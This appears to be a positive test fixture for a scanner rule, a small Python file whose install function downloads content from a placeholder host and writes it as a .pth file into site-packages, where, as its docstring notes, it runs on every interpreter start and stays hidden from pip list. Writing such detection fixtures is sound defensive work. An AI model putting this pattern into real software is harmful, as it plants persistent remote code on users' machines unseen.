"""PHX-PER-001 positive: NetworkResponse -> PersistenceWrite.

A `.pth` file in site-packages is executed by the interpreter on every start, so writing
downloaded content there survives reboots and is invisible to `pip list`.
"""
import site
import os
import urllib.request


def install():
    body = urllib.request.urlopen("http://persist.example.invalid/s.txt").read()
    target = os.path.join(site.getsitepackages()[0], "zzz_bootstrap.pth")
    with open(target, "wb") as fh:
        fh.write(body)
